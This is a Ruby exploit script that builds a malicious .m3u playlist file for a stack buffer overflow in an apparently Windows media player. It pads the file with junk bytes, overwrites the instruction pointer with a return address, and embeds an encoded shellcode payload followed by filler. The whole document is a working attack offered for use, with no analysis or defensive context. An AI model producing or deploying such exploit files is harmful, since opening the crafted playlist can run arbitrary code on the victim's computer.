#!/usr/bin/env ruby

file = "exploit.m3u"

junk = "\x41" * 35050 #35058
eip = "\xf6\x38\x9f\x7c" # Memory Adress #7c 9f 38 f6  #01AB7228   #OP code for call ebx FFD3
nops = "\xcc" * 19748 #Start ESP - Start EBX
shellcode = "\xdb\xd3\xd9\x74\x24\xf4\x5b\x31\xc9\xbd\xf4\xc1\x6b\x1e" +
"\xb1\x31\x31\x6b\x18\x83\xeb\xfc\x03\x6b\xe0\x23\x9e\xe2" +
"\xe0\x26\x61\x1b\xf0\x46\xeb\xfe\xc1\x46\x8f\x8b\x71\x77" +
"\xdb\xde\x7d\xfc\x89\xca\xf6\x70\x06\xfc\xbf\x3f\x70\x33" +
"\x40\x13\x40\x52\xc2\x6e\x95\xb4\xfb\xa0\xe8\xb5\x3c\xdc" +
"\x01\xe7\x95\xaa\xb4\x18\x92\xe7\x04\x92\xe8\xe6\x0c\x47" +
"\xb8\x09\x3c\xd6\xb3\x53\x9e\xd8\x10\xe8\x97\xc2\x75\xd5" +
"\x6e\x78\x4d\xa1\x70\xa8\x9c\x4a\xde\x95\x11\xb9\x1e\xd1" +
"\x95\x22\x55\x2b\xe6\xdf\x6e\xe8\x95\x3b\xfa\xeb\x3d\xcf" +
"\x5c\xd0\xbc\x1c\x3a\x93\xb2\xe9\x48\xfb\xd6\xec\x9d\x77" +
"\xe2\x65\x20\x58\x63\x3d\x07\x7c\x28\xe5\x26\x25\x94\x48" +
"\x56\x35\x77\x34\xf2\x3d\x95\x21\x8f\x1f\xf3\xb4\x1d\x1a" +
"\xb1\xb7\x1d\x25\xe5\xdf\x2c\xae\x6a\xa7\xb0\x65\xcf\x57" +
"\xfb\x24\x79\xf0\xa2\xbc\x38\x9d\x54\x6b\x7e\x98\xd6\x9e" +
"\xfe\x5f\xc6\xea\xfb\x24\x40\x06\x71\x34\x25\x28\x26\x35" +
"\x6c\x4b\xa9\xa5\xec\xa2\x4c\x4e\x96\xba"
junk2 = "\x43" * (60000 - (junk + eip + nops + shellcode).size)

exploit = junk + eip + nops + shellcode + junk2 

File.open(file, 'w') {|f| f.write(exploit)}
puts "File #{file} was created"